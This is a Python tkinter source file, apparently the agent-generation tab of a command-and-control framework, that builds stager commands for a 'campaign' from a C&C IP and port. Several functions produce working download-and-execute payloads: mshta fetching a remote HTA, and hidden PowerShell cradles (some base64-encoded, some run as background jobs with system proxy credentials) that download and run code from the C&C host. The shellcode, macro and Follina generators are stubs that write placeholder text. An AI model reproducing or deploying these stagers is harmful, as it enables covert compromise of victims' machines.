import tkinter as tk
from tkinter import ttk, messagebox
import base64
import os

# -------------------------------
# Agent generator functions
# -------------------------------

def generate_hta_agent_str(host, port, ssl):
    if ssl:
        return f"mshta https://{host}:{port}/hta_agent\npowershell -c \"mshta https://{host}:{port}/hta_agent\""
    else:
        return f"mshta http://{host}:{port}/hta_agent\npowershell -c \"mshta http://{host}:{port}/hta_agent\""

def generate_pwsh_job_str(host, port, ssl):
    commandJ = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))}"
    commandP = 'Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{agent}\')))" -WindowStyle Hidden'
    raw_agent = "/raw_agent"
    http = "https" if ssl else "http"
    agent = f"$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{http}://{host}:{port}{raw_agent}');IEX($s)"
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    JOB = commandJ.replace('{agent}', encoded)
    PROCESS = commandP.replace('{agent}', encoded)
    return f"Powershell Job:\n{JOB}\nPowershell Process:\n{PROCESS}"

def generate_pwsh_file_str(host, port, ssl):
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))"
    hjf_agent = "/hjf_agent"
    http = "https" if ssl else "http"
    agent = f"$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{http}://{host}:{port}{hjf_agent}');IEX($s)"
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    return f"Powershell File:\n{commandF.replace('{agent}', encoded)}"

def generate_pwsh_sct_str(host, port, ssl):
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))"
    hjfs_agent = "/hjfs_agent"
    http = "https" if ssl else "http"
    agent = f"$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{http}://{host}:{port}{hjfs_agent}');IEX($s)"
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    return f"Powershell SCT:\n{commandF.replace('{agent}', encoded)}"

def generate_pwsh_misc_str(host, port, ssl):
    http = "https" if ssl else "http"
    raw_agent = "/raw_agent"
    return f"Simple Powershell Agent:\npowershell -w hidden \"Invoke-Expression((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{raw_agent}'))\""

def generate_pwsh_base64_str(host, port, ssl):
    http = "https" if ssl else "http"
    b64_stager = "/b64_stager"
    agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{host}:{port}{b64_stager}');IEX($S)"
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    return f"Powershell Base64:\npowershell -w hidden \"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{encoded}')))\""

def generate_pwsh_base52_str(host, port, ssl):
    http = "https" if ssl else "http"
    b52_stager = "/b52_stager"
    b52_agent = "/b52_agent"
    agent1 = f"powershell -w hidden \"IEX((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{b52_stager}'))\""
    agent2 = f"powershell -w hidden \"IEX((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{b52_agent}'))\""
    return f"Powershell Base52:\n{agent1}\n{agent2}"

def generate_cmd_shellcodex64_str(host, port, ssl, campaign_folder):
    # This is a placeholder representing the actual compilation process.
    result = f"CMD Shellcodex64 agent generated and saved to {os.path.join(campaign_folder, 'cmd_shellcodex64.txt')}"
    with open(os.path.join(campaign_folder, "cmd_shellcodex64.txt"), "w") as f:
        f.write(result)
    return result

def generate_cmd_shellcodex86_str(host, port, ssl, campaign_folder):
    # This is a placeholder representing the actual compilation process.
    result = f"CMD Shellcodex86 agent generated and saved to {os.path.join(campaign_folder, 'cmd_shellcodex86.txt')}"
    with open(os.path.join(campaign_folder, "cmd_shellcodex86.txt"), "w") as f:
        f.write(result)
    return result

def generate_word_macro_str(host, port, ssl, campaign_folder):
    http = "https" if ssl else "http"
    raw_agent = "/raw_agent"
    result = f"Word Macro agent generated and saved to {os.path.join(campaign_folder, 'Word_macro.vba')}.\nDownload from {http}://{host}:{port}{raw_agent}"
    with open(os.path.join(campaign_folder, "Word_macro.vba"), "w") as f:
        f.write(result)
    return result

def generate_excel_macro_str(host, port, ssl, campaign_folder):
    http = "https" if ssl else "http"
    raw_agent = "/raw_agent"
    result = f"Excel Macro agent generated and saved to {os.path.join(campaign_folder, 'Excel_macro.vba')}.\nDownload from {http}://{host}:{port}{raw_agent}"
    with open(os.path.join(campaign_folder, "Excel_macro.vba"), "w") as f:
        f.write(result)
    return result

def generate_follina_agent_str(host, port, ssl, campaign_folder):
    http = "https" if ssl else "http"
    follina_url = "/follina_url"
    result = f"Follina agent generated and saved to {os.path.join(campaign_folder, 'follina.html')} and {os.path.join(campaign_folder, 'Follinadoc.docx')}.\nAccess via {http}://{host}:{port}{follina_url}"
    with open(os.path.join(campaign_folder, "follina.html"), "w") as f:
        f.write(result)
    with open(os.path.join(campaign_folder, "Follinadoc.docx"), "w") as f:
        f.write("Dummy DOCX content for Follina agent.")
    return result

# -------------------------------
# AgentGenerationTab class
# -------------------------------

class AgentGenerationTab:
    def __init__(self, parent, campaign_tab, logger):
        self.campaign_tab = campaign_tab  # to retrieve campaign settings
        self.logger = logger              # to log messages
        self.frame = ttk.Frame(parent)
        self.selected_agents = {}  # mapping agent name to tk.BooleanVar
        # Define agent options: key -> (generator_function, requires_campaign_folder)
        self.agent_options = {
            "HTA Agent": (generate_hta_agent_str, False),
            "Powershell Job": (generate_pwsh_job_str, False),
            "Powershell File": (generate_pwsh_file_str, False),
            "Powershell SCT": (generate_pwsh_sct_str, False),
            "Powershell Misc": (generate_pwsh_misc_str, False),
            "Powershell Base64": (generate_pwsh_base64_str, False),
            "Powershell Base52": (generate_pwsh_base52_str, False),
            "CMD Shellcode x64": (generate_cmd_shellcodex64_str, True),
            "CMD Shellcode x86": (generate_cmd_shellcodex86_str, True),
            "Word Macro": (generate_word_macro_str, True),
            "Excel Macro": (generate_excel_macro_str, True),
            "Follina Agent": (generate_follina_agent_str, True)
        }
        self.create_widgets()

    def create_widgets(self):
        # Frame for checkboxes
        checkbox_frame = ttk.LabelFrame(self.frame, text="Select Agent Types")
        checkbox_frame.pack(fill=tk.X, padx=5, pady=5)

        # Create checkboxes for each agent option
        for i, option in enumerate(self.agent_options):
            var = tk.BooleanVar(value=True)
            chk = ttk.Checkbutton(checkbox_frame, text=option, variable=var)
            chk.grid(row=i // 2, column=i % 2, sticky=tk.W, padx=5, pady=2)
            self.selected_agents[option] = var

        # Button to generate agents
        self.btn_generate = ttk.Button(self.frame, text="Generate Agents", command=self.generate_agents_ui)
        self.btn_generate.pack(pady=5)
        # Text widget to display agent summary
        self.text_agent = tk.Text(self.frame, height=20)
        self.text_agent.pack(fill=tk.BOTH, padx=5, pady=5, expand=True)

    def generate_agents_ui(self):
        host = self.campaign_tab.get_ip()
        port = self.campaign_tab.get_port()
        use_ssl = self.campaign_tab.get_ssl()
        
        try:
            campaign_name = self.campaign_tab.entry_campaign.get().strip()
        except AttributeError:
            messagebox.showerror("Error", "Please create a campaign first.")
            return

        if not host or not port or not campaign_name:
            messagebox.showerror("Error", "Please fill in Campaign Config with valid Campaign Name, C&C IP, and Port first.")
            return

        campaign_folder = campaign_name + "_campaign"
        if not os.path.exists(campaign_folder):
            messagebox.showerror("Error", f"Campaign folder '{campaign_folder}' does not exist. Start the campaign first.")
            return

        agent_results = []
        # For each selected agent type, generate the agent and save it in the campaign folder.
        for option, (func, need_folder) in self.agent_options.items():
            if self.selected_agents[option].get():
                try:
                    if need_folder:
                        agent_text = func(host, port, use_ssl, campaign_folder)
                    else:
                        agent_text = func(host, port, use_ssl)
                        # Save the generated agent text into a file in the campaign folder.
                        filename = os.path.join(campaign_folder, option.replace(" ", "_").lower() + ".txt")
                        with open(filename, "w") as f:
                            f.write(agent_text)
                        agent_text += f"\n(Saved to {filename})"
                    agent_results.append(f"[-] {option}\n{agent_text}")
                except Exception as e:
                    agent_results.append(f"[-] {option} - Error: {e}")
                    self.logger(f"Error generating agent {option}: {e}") #Log the error

        if not agent_results:
            messagebox.showinfo("No Agents Selected", "Please select at least one agent type.")
            return

        self.text_agent.delete(1.0, tk.END)
        for p in agent_results:
            self.text_agent.insert(tk.END, p + "\n\n")
        self.logger("Agents generated in campaign folder.")
